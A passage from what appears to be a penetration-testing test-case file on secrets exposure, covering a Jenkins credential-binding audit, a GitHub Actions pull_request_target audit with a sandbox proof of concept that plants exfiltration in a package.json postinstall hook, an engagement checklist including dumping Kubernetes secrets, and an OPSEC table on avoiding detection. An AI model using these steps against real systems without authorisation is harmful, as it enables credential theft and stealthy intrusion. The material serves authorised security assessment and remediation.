| **Prerequisites** | Jenkins read access via API token (admin or per-folder read credentials); network reachability to `${JENKINS_URL}/api/json`; a local clone of every in-scope `Jenkinsfile` (or API access to fetch each); authorization to enumerate credentials at the system, global, and folder scopes; understanding of the `withCredentials` binding syntax across Declarative and Scripted pipelines. |
| **Objective** | Enumerate every Jenkins credential (system, global, folder-scoped), map every `withCredentials` binding in every Jenkinsfile, and flag misuse patterns: credential written to archived artifact, credential echoed to log, credential passed as process argument (visible to co-tenant processes). |
| **Tools** | curl, jq, grep, Bash |
| **Steps** | 1. Enumerate credentials via API: `curl -u user:token "${JENKINS_URL}/credentials/store/system/api/json?tree=domains[name,credentials[id,description,scope]]"`<br>2. Folder-scoped: iterate every folder in `jenkins_jobs.txt` and query `${JENKINS_URL}/job/${folder}/credentials/store/folder/api/json`<br>3. Fetch every Jenkinsfile: `for j in jenkins_jobs.txt; do curl -u user:token "${JENKINS_URL}/job/${j}/api/json?tree=definition" > ${j}.Jenkinsfile; done`<br>4. Parse every `withCredentials` binding: `grep -nE 'withCredentials\(\[' *.Jenkinsfile`<br>5. For each binding, identify how the bound variable is used downstream; flag misuse patterns:<br>   - `echo $VAR` / `print $VAR` (HIGH — logs the value)<br>   - `> file` / `>> file` where file may be archived (HIGH — leaks via artifact)<br>   - `--flag $VAR` / `-Dprop=$VAR` (MEDIUM — visible in process list)<br>   - `sh "tool $VAR"` (HIGH — same as echo if tool prints its args)<br>6. Build findings table: `Jenkinsfile:line, credential_id, binding_pattern, severity, remediation`<br>7. Cross-reference with TC-SM-014 inventory to identify cluster-wide blast radius |
| **Expected Result** | Catalog of every Jenkins credential with scope (system/global/folder), every `withCredentials` binding with misuse classification, and prioritized remediation recommendations. |
| **Cleanup** | `shred -u` the local Jenkinsfile copies (they may contain non-secret pipeline logic the client considers proprietary). Preserve the findings table. |
| **References** | guides/cicd-secret-sprawl-and-sast-rule-deep-dive.md §6; payloads.md §11.5 |

### TC-SM-018: GitHub Actions `pull_request_target` Workflow Audit

| Field | Value |
|------|-----|
| **ID** | TC-SM-018 |
| **Name** | GitHub Actions `pull_request_target` + `secrets.*` Workflow Audit |
| **Prerequisites** | Output of TC-SM-014 (the GitHub Actions inventory); every workflow YAML pulled locally into `workflows/*.yml`; authorization to read every in-scope repo's `.github/workflows/` directory; understanding of the `pull_request_target` exfil pattern (deep-dive guide §4.5); sandbox GitHub repo for PoC demonstration if the engagement includes active exploitation. |
| **Objective** | Programmatically detect every GitHub Actions workflow that combines `on: pull_request_target` with `secrets.*` usage — the canonical fork-PR exfil vector. Produce a prioritized list of CRITICAL findings with the specific workflow file, the secret reference, and the remediation (use `pull_request` instead, OR gate with a label-based check). |
| **Tools** | grep, jq, Bash, gh |
| **Steps** | 1. Identify every workflow using `pull_request_target`: `grep -lE 'pull_request_target' workflows/*.yml > prt_workflows.txt`<br>2. For each, check for `secrets.*` reference: `for wf in $(cat prt_workflows.txt); do grep -qE 'secrets\.' "$wf" && echo "CRITICAL: $wf"; done`<br>3. For each CRITICAL finding, extract the specific pattern: `grep -nE '(pull_request_target\|secrets\.\|ref:.*github\.event\.pull_request\.head\.sha)' "$wf"`<br>4. Cross-reference with TC-SM-014 to identify which secrets are exposed: parse `${{ secrets.X }}` and look up in `workflow_secret_map.tsv`<br>5. Also flag subtler variants (deep-dive guide §4.5):<br>   - `actions/checkout` with `persist-credentials: true` (default!) checking out attacker ref<br>   - `workflow_dispatch` with `inputs.*` flowing into shell + `secrets.*` in env<br>   - `issue_comment` / `issues` trigger with secrets (attacker PR review vector)<br>6. Build findings table: `repo, workflow_file, trigger_type, secret_exposed, variant, severity, remediation`<br>7. PoC (sandbox only — never on client prod): create fork, plant exfil in `package.json` postinstall, open PR, observe exfil in sandbox runner logs |
| **Expected Result** | Complete catalog of every CRITICAL `pull_request_target` + secrets workflow with the specific exposed secret, the exploit variant, and the prioritized remediation. Optional PoC demonstration in sandbox. |
| **Cleanup** | Close sandbox PoC PR; rotate sandbox secrets; preserve findings table for client deliverable. |
| **References** | guides/cicd-secret-sprawl-and-sast-rule-deep-dive.md §4; payloads.md §11.1, §11.2 |

---

## End-to-End Verification Checklist

Use this checklist at engagement close to verify every TC has been executed, every finding documented, and every OPSEC consideration addressed.

### Pre-Engagement

- [ ] Signed SOW on file naming every repo, host, image, mobile binary, web app, cloud account, vault, CI/CD pipeline, and K8s cluster in scope
- [ ] OPSEC budget defined: max live verifications per day, max bulk-read concurrency, no-verification mode for sensitive targets
- [ ] Canary-token policy defined: heuristic check mandatory before any live API call
- [ ] Egress path defined: tmpfs or encrypted working directory; retention period; destruction protocol
- [ ] Rotation coordination pre-agreed: immediate-notify vs end-of-engagement-notify; rotation ceremony owner

### Discovery (TC-SM-001 through TC-SM-005)

- [ ] TC-SM-001: Repository history sweep complete (local mirror-clone, no remote scan)
- [ ] TC-SM-002: Filesystem sweep complete on every in-scope host
- [ ] TC-SM-003: Custom SAST rules authored, validated at 95%/95% precision/recall
- [ ] TC-SM-004: APK extraction complete for every in-scope mobile binary
- [ ] TC-SM-005: Web app JS crawl complete; sourcemaps checked; debug endpoints enumerated

### Secrets-Management Platform (TC-SM-006 through TC-SM-007)

- [ ] TC-SM-006: Vault token capabilities enumerated; blast-radius graph produced; token NOT revoked
- [ ] TC-SM-007: AWS Secrets Manager + SSM Parameter Store enumerated; every readable secret cataloged; CloudTrail events documented

### CI/CD & Container (TC-SM-008 through TC-SM-010, TC-SM-013 through TC-SM-018)

- [ ] TC-SM-008: GitHub Actions `pull_request_target` PoC demonstrated in sandbox; remediation documented
- [ ] TC-SM-009: K8s secrets dumped across every reachable namespace; imagePullSecrets and SA tokens extracted
- [ ] TC-SM-010: Container image layers walked; every layer scanned; hidden secrets cataloged
- [ ] TC-SM-013: Terraform state files extracted; every secret-bearing attribute cataloged
- [ ] TC-SM-014: CI/CD inventory complete across every provider (GitHub/GitLab/Jenkins/CircleCI/TFC)
- [ ] TC-SM-015: Custom gitleaks ruleset validated at 95%/95%; ruleset packaged for client hand-off
- [ ] TC-SM-016: semgrep dataflow rules authored and tuned; secret-to-sink findings documented
- [ ] TC-SM-017: Jenkins credentials binding audit complete; every misuse pattern flagged
- [ ] TC-SM-018: Every `pull_request_target` + `secrets.*` workflow flagged as CRITICAL

### Verification & OPSEC (TC-SM-011)

- [ ] TC-SM-011: Canary-token heuristics applied to every candidate; verification budget not exceeded
- [ ] Every live verification logged with timestamp, IP used, provider response code
- [ ] Zero unintended honeytoken triggers (if any triggered, document and notify client immediately)

### Reporting (TC-SM-012)

- [ ] TC-SM-012: Blast-radius graph produced; rotation-status table populated
- [ ] Every secret in the report masked (e.g., `AKIA...XYZ9`) — no raw values in deliverable
- [ ] Severity classification applied per Severity Calibration table
- [ ] Recommendations prioritized (immediate / 2 weeks / 1 month / 1 quarter)
- [ ] Custom ruleset packaged (gitleaks + semgrep + bearer) with precision/recall documentation

### Post-Engagement

- [ ] All working files `shred -u`'d
- [ ] Final deliverable encrypted at rest
- [ ] Post-engagement rotation ceremony coordinated with client
- [ ] Engagement retrospective scheduled: what worked, what to improve next engagement

---

## Severity Calibration

| Severity | Criteria | Example |
|----------|----------|---------|
| **CRITICAL** | Verified live production secret with broad blast radius (Vault token to `secret/*`, AWS root-equivalent key, CI deploy token) | Verified Vault root token read across 200 secrets |
| **HIGH** | Verified live secret with limited blast radius, or unverified secret in production-critical code path | Verified Stripe test key; unverified prod AWS key in /etc |
| **MEDIUM** | Secret in non-production context (dev env, README example that looks real), or expired/rotated-but-unremoved secret | Old AWS key in 3-year-old commit (likely rotated) |
| **LOW** | Test/example/placeholder value that matches a secret regex but is clearly not real | `AKIAEXAMPLEEXAMPLE` in documentation |
| **INFO** | Insecure pattern (e.g., secret-handling code path) without an actual leaked secret | Code that logs `process.env.SECRET` to stdout |

---

## OPSEC Quick Reference

| Action | OPSEC Risk | Mitigation |
|--------|-----------|------------|
| Remote scan via trufflehog github | HIGH — GitHub Secret Scanning may alert | Mirror-clone, local scan |
| `--only-verified` on AWS keys | HIGH — CloudTrail event + GuardDuty anomaly | Manual lightest-touch (STS GetCallerIdentity) only after explicit approval |
| Bulk Vault reads | MEDIUM — audit device anomaly | Spread reads over time |
| HashiCorp Vault token revocation | HIGH — immediately alerts Vault admin | NEVER revoke during engagement |
| AWS Secrets Manager bulk get | MEDIUM — CloudTrail data event spike | Cap concurrency, distribute over time |
| Reading K8s secrets with `kubectl get` | LOW — audit logged but normal pattern | Use existing SA token, do not create new SAs |
| Image registry API probing | LOW — registry access logs | Use existing creds; avoid anonymous pulls from unusual IPs |

---

## Cross-References

- **`SKILL.md`** — methodology, six-phase process, defense perspective
- **`payloads.md`** — every command catalogued by section
- **`guides/secret-management-attack-playbook.md`** — end-to-end workflow walkthrough
- **`guides/vault-and-cloud-kms-attack-playbook.md`** — Vault and cloud KMS exploitation depth
- **`guides/cicd-secret-sprawl-and-sast-rule-deep-dive.md`** — CI/CD sprawl audit and custom SAST rule authoring
- **`skills/security-review/SKILL.md`** — broader checklist this skill extends
- **`skills/repo-scan/SKILL.md`** — codebase classification input
- **`skills/cloud-security/SKILL.md`** — IAM context for cloud secret findings
- **`skills/post-exploitation/SKILL.md`** — host takeover after credential-driven access
